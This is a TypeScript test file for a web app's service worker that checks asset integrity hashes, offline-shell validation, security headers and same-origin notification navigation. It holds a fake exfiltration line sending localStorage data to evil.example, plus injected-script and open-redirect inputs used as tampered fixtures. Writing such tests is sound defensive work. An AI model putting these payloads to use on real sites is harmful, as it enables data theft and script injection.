// The service worker (public/sw.js) run against fake worker globals: it serves
// and caches only the bytes its build lists (INTEGRITY, SHELL_SHA256), and a
// tapped notification leads only to a path of this origin. Also the build
// step that writes the table (build/service-worker.ts).

import assert from "node:assert/strict";
import { createHash } from "node:crypto";
import { mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import test from "node:test";
import { fillServiceWorker, inlineScriptSources } from "../build/service-worker.js";

const ORIGIN = "https://droppen.test";
const SOURCE = readFileSync(new URL("../public/sw.js", import.meta.url), "utf8");
/** The worker's cache (bumped by hand as the kill switch: docs/web-integrity.md). */
const CACHE = /^const CACHE = "([^"]+)";$/m.exec(SOURCE)![1]!;
const sha = (bytes: string | Uint8Array) => createHash("sha256").update(bytes).digest("hex");

const APP = "console.log('the app')";
const VENDOR = "export const lib = 1;";
const EVIL = "fetch('https://evil.example/' + localStorage.key(0))";
const SHELL = `<!doctype html><html><head><title>Droppen</title></head><body><script type="module" src="/assets/app-1.js"></script></body></html>`;
/** A built shell with an inline boot script, as the real one has. */
const BOOT = "document.documentElement.dataset.boot = '1'";
const BUILT = SHELL.replace("<title>Droppen</title>", `<title>Droppen</title><script>${BOOT}</script>`);
const marked = (origin = "wss://droppen.test") => SHELL.replace("<head>", `<head><meta name="rh-hub" content="${origin}" />`);
const JS = { "content-type": "text/javascript; charset=utf-8" };
const HTML = { "content-type": "text/html; charset=utf-8" };

/** One Cache: request URL → response, as the browser keeps them. */
class FakeCache {
  entries = new Map<string, Response>();
  private key(req: Request | string) {
    return new URL(typeof req === "string" ? req : req.url, ORIGIN).href;
  }
  async match(req: Request | string) {
    return this.entries.get(this.key(req))?.clone();
  }
  async put(req: Request | string, res: Response) {
    this.entries.set(this.key(req), res.clone());
  }
  async delete(req: Request | string) {
    return this.entries.delete(this.key(req));
  }
  async keys() {
    return [...this.entries.keys()].map((url) => new Request(url));
  }
  async text(path: string) {
    return (await this.match(path))?.text();
  }
}

type Listener = (event: any) => void;

/**
 * Load sw.js with the build's markers filled in (`table`, `shell`) into a fake
 * worker: its `caches`, a `fetch` answering from `network` (path → [body,
 * headers] or a status), `clients` that record what they were asked.
 */
function worker(
  opts: { network?: Record<string, [string, Record<string, string>] | number>; precache?: string[]; table?: Record<string, string>; shell?: string; scripts?: string[]; httpCache?: Record<string, string> } = {},
) {
  const table = opts.table ?? { "/assets/app-1.js": sha(APP), "/assets/vendor-1.js": sha(VENDOR) };
  const text = SOURCE.replace("const PRECACHE = [];", `const PRECACHE = ${JSON.stringify(opts.precache ?? [])};`)
    .replace("const INTEGRITY = {};", `const INTEGRITY = ${JSON.stringify(table)};`)
    .replace('const SHELL_SHA256 = "";', `const SHELL_SHA256 = ${JSON.stringify(opts.shell ?? sha(SHELL))};`)
    .replace("const SHELL_SCRIPTS = [];", `const SHELL_SCRIPTS = ${JSON.stringify(opts.scripts ?? [])};`);
  assert.notEqual(text, SOURCE, "the markers are there to fill in");
  const stores = new Map<string, FakeCache>();
  const caches = {
    async open(name: string) {
      if (!stores.has(name)) stores.set(name, new FakeCache());
      return stores.get(name)!;
    },
    async keys() {
      return [...stores.keys()];
    },
    async delete(name: string) {
      return stores.delete(name);
    },
  };
  const network = { ...(opts.network ?? {}) };
  // The browser's HTTP cache: what a plain fetch gets first; `cache: "reload"` passes it by.
  const httpCache = { ...(opts.httpCache ?? {}) };
  const fetched: string[] = [];
  const fetch = async (input: Request | string, init?: { cache?: string }) => {
    const url = new URL(typeof input === "string" ? input : input.url, ORIGIN);
    const reload = init?.cache === "reload";
    fetched.push(`${url.pathname}${reload ? " (reload)" : ""}`);
    if (!reload && httpCache[url.pathname] !== undefined) return new Response(httpCache[url.pathname], { headers: JS });
    const answer = network[url.pathname];
    if (answer === undefined) throw new TypeError("Failed to fetch");
    if (typeof answer === "number") return new Response("not found", { status: answer });
    return new Response(answer[0], { headers: answer[1] });
  };
  const listeners = new Map<string, Listener[]>();
  const opened: string[] = [];
  const posted: unknown[] = [];
  const windows: { focus(): Promise<void>; postMessage(m: unknown): void }[] = [];
  const self = {
    location: new URL(`${ORIGIN}/sw.js`),
    addEventListener(type: string, fn: Listener) {
      listeners.set(type, [...(listeners.get(type) ?? []), fn]);
    },
    skipWaiting() {},
    registration: { showNotification: async () => undefined },
    clients: {
      claim: async () => undefined,
      matchAll: async () => windows,
      openWindow: async (url: string) => void opened.push(url),
    },
  };
  new Function("self", "caches", "fetch", "crypto", "navigator", text)(self, caches, fetch, globalThis.crypto, {});

  /** Dispatch `type` and wait for everything it waits on; the response, for a fetch. */
  async function dispatch(type: string, extra: Record<string, unknown> = {}): Promise<Response | undefined> {
    const waits: Promise<unknown>[] = [];
    let responded: Promise<Response> | undefined;
    const event = { ...extra, waitUntil: (p: Promise<unknown>) => void waits.push(p), respondWith: (p: Promise<Response>) => void (responded = p) };
    for (const fn of listeners.get(type) ?? []) fn(event);
    const res = responded ? await responded : undefined;
    // A promise waited on may add another (a fetch puts its copy once it has the response).
    for (let i = 0; i < waits.length; i++) await waits[i];
    return res;
  }
  return {
    stores,
    network,
    httpCache,
    fetched,
    opened,
    posted,
    windows,
    cache: () => caches.open(CACHE),
    install: () => dispatch("install"),
    activate: () => dispatch("activate"),
    get: (path: string) => dispatch("fetch", { request: new Request(`${ORIGIN}${path}`) }),
    navigate: (path: string) => dispatch("fetch", { request: { url: `${ORIGIN}${path}`, method: "GET", mode: "navigate" } }),
    tap: (url: unknown) => dispatch("notificationclick", { notification: { close() {}, data: { url } } }),
  };
}

test("an asset whose bytes are its build's is fetched, cached and served from the cache", async () => {
  const sw = worker({ network: { "/assets/app-1.js": [APP, JS] } });
  const first = await sw.get("/assets/app-1.js");
  assert.equal(await first!.text(), APP);
  assert.equal(await (await sw.cache()).text("/assets/app-1.js"), APP);
  delete sw.network["/assets/app-1.js"];
  const again = await sw.get("/assets/app-1.js");
  assert.equal(await again!.text(), APP, "from the cache, the network gone");
});

test("a tampered copy in the cache is never served: it is deleted and the asset fetched again", async () => {
  const sw = worker({ network: { "/assets/vendor-1.js": [VENDOR, JS] } });
  // What a page's script (or an earlier delivery) put there, under the stable vendor name.
  await (await sw.cache()).put("/assets/vendor-1.js", new Response(EVIL, { headers: JS }));
  const res = await sw.get("/assets/vendor-1.js");
  assert.equal(await res!.text(), VENDOR);
  assert.equal(await (await sw.cache()).text("/assets/vendor-1.js"), VENDOR, "the good copy replaced it");
});

test("a tampered asset from the network is refused and never cached", async () => {
  const sw = worker({ network: { "/assets/app-1.js": [EVIL, JS] } });
  const res = await sw.get("/assets/app-1.js");
  assert.equal(res!.status, 502);
  assert.doesNotMatch(await res!.text(), /evil/);
  assert.equal(await (await sw.cache()).match("/assets/app-1.js"), undefined);
  assert.deepEqual(sw.fetched, ["/assets/app-1.js", "/assets/app-1.js (reload)"], "asked the network itself once more");
});

test("a bad copy in the browser's HTTP cache is passed by for the network's", async () => {
  const sw = worker({ network: { "/assets/app-1.js": [APP, JS] }, httpCache: { "/assets/app-1.js": EVIL } });
  const res = await sw.get("/assets/app-1.js");
  assert.equal(await res!.text(), APP);
  assert.equal(await (await sw.cache()).text("/assets/app-1.js"), APP);
});

test("HTML answered for an asset is neither served as it nor cached; a 404 passes through", async () => {
  const sw = worker({ network: { "/assets/app-1.js": [SHELL, HTML], "/assets/vendor-1.js": 404 } });
  assert.equal((await sw.get("/assets/app-1.js"))!.status, 502);
  assert.equal((await sw.get("/assets/vendor-1.js"))!.status, 404);
  assert.equal((await (await sw.cache()).keys()).length, 0);
});

test("an asset the build does not list comes from the network and is never kept; a cached copy of it is dropped", async () => {
  const sw = worker({ network: { "/assets/newer-2.js": ["newer", JS] } });
  await (await sw.cache()).put("/assets/newer-2.js", new Response(EVIL, { headers: JS }));
  const res = await sw.get("/assets/newer-2.js");
  assert.equal(await res!.text(), "newer");
  assert.equal(await (await sw.cache()).match("/assets/newer-2.js"), undefined);
});

test("install precaches the boot set only with the listed bytes, replacing a tampered copy", async () => {
  const sw = worker({ precache: ["/assets/app-1.js", "/assets/vendor-1.js"], network: { "/assets/app-1.js": [APP, JS], "/assets/vendor-1.js": [EVIL, JS] } });
  await (await sw.cache()).put("/assets/app-1.js", new Response(EVIL, { headers: JS }));
  await sw.install();
  assert.equal(await (await sw.cache()).text("/assets/app-1.js"), APP);
  assert.equal(await (await sw.cache()).match("/assets/vendor-1.js"), undefined);
});

test("activate drops other caches, unlisted and tampered assets, a foreign shell and anything else", async () => {
  const sw = worker({ network: { "/sessions": [marked(), HTML] } });
  const cache = await sw.cache();
  await cache.put("/assets/app-1.js", new Response(APP, { headers: JS }));
  await cache.put("/assets/vendor-1.js", new Response(EVIL, { headers: JS }));
  await cache.put("/assets/old-0.js", new Response("old", { headers: JS }));
  await cache.put("/__rh-sw/listed", new Response("{}", { headers: { "content-type": "application/json" } }));
  await cache.put("/", new Response(marked().replace("<title>Droppen</title>", "<title>Droppen</title><script>evil()</script>"), { headers: HTML }));
  sw.stores.set("rh-sw-v0-older", new FakeCache());
  await sw.activate();
  assert.deepEqual([...sw.stores.keys()], [CACHE]);
  const left = (await cache.keys()).map((r) => new URL(r.url).pathname).sort();
  assert.deepEqual(left, ["/", "/assets/app-1.js"]);
  assert.equal(await cache.text("/"), marked(), "the shell seeded from the network, this build's");
});

test("the offline shell: kept and served only when it is this build's, this origin's hub's marker aside", async () => {
  // Online: served as it came, and kept only if it is this build's.
  const sw = worker({ network: { "/sessions": [marked(), HTML] } });
  assert.equal(await (await sw.navigate("/sessions"))!.text(), marked());
  assert.equal(await (await sw.cache()).text("/"), marked(), "with the marker: kept");
  delete sw.network["/sessions"];
  assert.equal(await (await sw.navigate("/sessions"))!.text(), marked(), "offline: the kept shell");

  // Another build's shell (a newer release while this worker is the older one): served online, never kept.
  const newer = worker({ network: { "/signin": [SHELL.replace("app-1", "app-2"), HTML] } });
  assert.match(await (await newer.navigate("/signin"))!.text(), /app-2/);
  assert.equal(await (await newer.cache()).match("/"), undefined);

  // A marker that is not exactly the hub's, or not where it writes it, is part of the shell.
  for (const odd of [SHELL.replace("<head>", '<head><meta name="rh-hub" content="javascript:x" />'), SHELL.replace("</head>", '<meta name="rh-hub" content="wss://x" /></head>')]) {
    const sw2 = worker({ network: { "/": [odd, HTML] } });
    await sw2.navigate("/");
    assert.equal(await (await sw2.cache()).match("/"), undefined, odd);
  }

  // A tampered shell in the cache is not served offline, and goes.
  const offline = worker();
  await (await offline.cache()).put("/", new Response(SHELL.replace("</body>", "<script>evil()</script></body>"), { headers: HTML }));
  await assert.rejects(offline.navigate("/sessions"));
  assert.equal(await (await offline.cache()).match("/"), undefined);
});

test("a shell pointed at any hub but this origin's own is never kept, served or left in the cache", async () => {
  const own = '<meta name="rh-hub" content="wss://droppen.test" />';
  const foreign = [
    ["another hub", marked("wss://evil.example")],
    ["ws:// on an https origin", marked("ws://droppen.test")],
    ["another port", marked("wss://droppen.test:8443")],
    ["a second marker", SHELL.replace("<head>", `<head>${own}<meta name="rh-hub" content="wss://evil.example" />`)],
    ["the marker twice", SHELL.replace("<head>", `<head>${own}${own}`)],
    ["the marker elsewhere", SHELL.replace("</head>", `${own}</head>`)],
  ];
  for (const [what, shell] of foreign) {
    // Online: served as it came (the page is the network's), never kept.
    const sw = worker({ network: { "/sessions": [shell, HTML] } });
    assert.equal(await (await sw.navigate("/sessions"))!.text(), shell, what);
    assert.equal(await (await sw.cache()).match("/"), undefined, `${what}: not kept`);
    // Written into the cache by a page: not served offline, and gone.
    const offline = worker();
    await (await offline.cache()).put("/", new Response(shell, { headers: HTML }));
    await assert.rejects(offline.navigate("/sessions"), `${what}: not served`);
    assert.equal(await (await offline.cache()).match("/"), undefined, `${what}: dropped`);
    // And on activate.
    const later = worker();
    await (await later.cache()).put("/", new Response(shell, { headers: HTML }));
    await later.activate();
    assert.equal(await (await later.cache()).match("/"), undefined, `${what}: dropped on activate`);
  }
});

test("the offline shell is served with the worker's own headers, never the cached ones", async () => {
  const scripts = ["'sha256-boot'"];
  const sw = worker({ scripts });
  // A page wrote this build's shell with a permissive policy of its own.
  await (await sw.cache()).put(
    "/",
    new Response(marked(), { headers: { "content-type": "text/html", "content-security-policy": "script-src * 'unsafe-inline'", "x-from-the-page": "1" } }),
  );
  const res = (await sw.navigate("/sessions"))!;
  assert.equal(await res.text(), marked());
  assert.equal(res.headers.get("x-from-the-page"), null);
  assert.equal(res.headers.get("content-type"), "text/html; charset=utf-8");
  assert.equal(res.headers.get("x-content-type-options"), "nosniff");
  assert.equal(res.headers.get("referrer-policy"), "no-referrer");
  assert.equal(res.headers.get("permissions-policy"), "publickey-credentials-get=(self), publickey-credentials-create=(self)");
  assert.equal(
    res.headers.get("content-security-policy"),
    "default-src 'self'; script-src 'self' 'sha256-boot'; style-src 'self' 'unsafe-inline'; img-src 'self' data: blob:; font-src 'self' data:; " +
      "connect-src 'self' wss://droppen.test https: wss:; worker-src 'self' blob:; manifest-src 'self'; frame-src 'none'; frame-ancestors 'none'; " +
      "base-uri 'self'; form-action 'self'; object-src 'none'",
  );
  // A local server's shell (no marker): the same policy on its own origin, framed by itself as that server allows.
  const local = worker({ scripts });
  await (await local.cache()).put("/", new Response(SHELL, { headers: { "content-security-policy": "frame-ancestors *" } }));
  const policy = (await local.navigate("/sessions"))!.headers.get("content-security-policy")!;
  assert.match(policy, /script-src 'self' 'sha256-boot';/);
  assert.match(policy, /connect-src 'self' wss:\/\/droppen\.test;/);
  assert.match(policy, /frame-ancestors 'self'/);
});

test("a tapped notification leads only to a path of this origin, focused or opened", async () => {
  const cases: [unknown, string][] = [
    ["/sessions/claude/abc?x=1#end", "/sessions/claude/abc?x=1#end"],
    ["https://evil.example/x", "/sessions"],
    ["//evil.example/x", "/sessions"],
    ["/\\evil.example/x", "/sessions"],
    ["/\t/evil.example/x", "/sessions"],
    ["javascript:alert(1)", "/sessions"],
    [42, "/sessions"],
    [undefined, "/sessions"],
  ];
  for (const [url, to] of cases) {
    const sw = worker();
    await sw.tap(url);
    assert.deepEqual(sw.opened, [to], `openWindow for ${String(url)}`);
    const open = worker();
    open.windows.push({ focus: async () => undefined, postMessage: (m) => void open.posted.push(m) });
    await open.tap(url);
    assert.deepEqual(open.posted, [{ type: "nav", url: to }], `postMessage for ${String(url)}`);
    assert.deepEqual(open.opened, []);
  }
});

test("the build writes every asset's sha256 and the shell's into sw.js, sorted, and fails without the markers", () => {
  const dir = mkdtempSync(join(tmpdir(), "sw-integrity-"));
  try {
    mkdirSync(join(dir, "assets", "fonts"), { recursive: true });
    writeFileSync(join(dir, "index.html"), BUILT);
    writeFileSync(join(dir, "assets", "vendor-1.js"), VENDOR);
    writeFileSync(join(dir, "assets", "app-1.js"), APP);
    writeFileSync(join(dir, "assets", "fonts", "a.woff2"), "font$&$'");
    writeFileSync(join(dir, "sw.js"), SOURCE);
    fillServiceWorker(dir, ["/assets/app-1.js"]);
    const text = readFileSync(join(dir, "sw.js"), "utf8");
    assert.match(text, /^const PRECACHE = \["\/assets\/app-1\.js"\];$/m);
    const table = JSON.parse(/^const INTEGRITY = (\{.*\});$/m.exec(text)![1]!);
    assert.deepEqual(Object.keys(table), ["/assets/app-1.js", "/assets/fonts/a.woff2", "/assets/vendor-1.js"]);
    assert.equal(table["/assets/fonts/a.woff2"], sha("font$&$'"));
    assert.match(text, new RegExp(`^const SHELL_SHA256 = "${sha(BUILT)}";$`, "m"));
    // The inline boot script's CSP source, as a hub allows it; the module script (src=) is none.
    const sources = JSON.parse(/^const SHELL_SCRIPTS = (\[.*\]);$/m.exec(text)![1]!);
    assert.deepEqual(sources, [`'sha256-${createHash("sha256").update(BOOT).digest("base64")}'`]);
    assert.deepEqual(inlineScriptSources(BUILT), sources);
    // Filled once: a second run finds no marker.
    assert.throws(() => fillServiceWorker(dir, []), /has no `const PRECACHE = \[\];` to fill in/);
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});
